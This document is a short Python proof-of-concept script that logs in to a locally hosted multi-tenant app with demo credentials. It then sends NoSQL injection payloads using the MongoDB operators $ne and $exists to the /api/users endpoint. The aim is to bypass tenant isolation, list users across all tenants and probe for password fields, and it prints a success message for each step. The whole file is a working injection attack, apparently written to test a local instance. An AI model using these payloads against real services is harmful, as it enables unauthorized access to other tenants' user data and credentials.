#!/usr/bin/env python3

import requests
import json

BASE_URL = "http://localhost:5000"

def exploit_nosql_injection():
    login_data = {"email": "demo@tenantguard.com", "password": "demo123"}
    login_response = requests.post(f"{BASE_URL}/api/auth/login", json=login_data)
    
    if login_response.status_code != 200:
        print("[-] Login failed")
        return False
    
    token = login_response.json().get('token')
    headers = {"Authorization": f"Bearer {token}"}
    
    print("[+] Testing NoSQL injection vulnerabilities...")
    
    # Test 1: Bypass tenant isolation using $ne operator
    print("\n[1] Testing tenant isolation bypass...")
    nosql_payload = {
        "search": {"tenantId": {"$ne": None}},
        "tenantId": {"$ne": None}
    }
    
    response = requests.get(
        f"{BASE_URL}/api/users",
        headers=headers,
        params=nosql_payload
    )
    
    if response.status_code == 200:
        users = response.json()
        print(f"[!] NOSQL INJECTION SUCCESS: Retrieved {len(users)} users across all tenants")
        for user in users[:3]:
            print(f"    User: {user.get('email')} | Tenant: {user.get('tenantId')}")
    
    # Test 2: Extract all users using $exists operator
    print("\n[2] Testing data extraction with $exists...")
    exists_payload = {
        "search": {"email": {"$exists": True}}
    }
    
    response = requests.get(
        f"{BASE_URL}/api/users",
        headers=headers,
        params=exists_payload
    )
    
    if response.status_code == 200:
        users = response.json()
        print(f"[!] DATA EXTRACTION SUCCESS: Found {len(users)} total users")
    
    # Test 3: Password field extraction
    print("\n[3] Testing sensitive field extraction...")
    password_payload = {
        "search": {"password": {"$exists": True}}
    }
    
    response = requests.get(
        f"{BASE_URL}/api/users",
        headers=headers,
        params=password_payload
    )
    
    if response.status_code == 200:
        users = response.json()
        print(f"[!] SENSITIVE DATA ACCESS: Retrieved {len(users)} users with password field check")
    
    return True

if __name__ == "__main__":
    exploit_nosql_injection()